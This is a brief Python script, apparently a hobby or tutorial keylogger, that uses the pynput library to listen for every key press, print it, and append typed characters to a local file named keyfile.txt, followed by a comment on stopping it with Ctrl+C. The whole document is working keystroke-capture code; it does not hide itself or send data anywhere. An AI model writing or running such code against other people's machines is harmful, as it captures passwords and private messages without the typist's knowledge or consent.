from pynput import keyboard

def key_pressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logkey:
        try:
            char = key.char
            logkey.write(char)
        except:
            print("Error getting char")


if __name__ == "__main__":
    listener = keyboard.Listener(on_press=key_pressed)
    listener.start()
    input()
    
#after running the program interuppt the program by clicking ctrl+c the keystrokes will be captured.
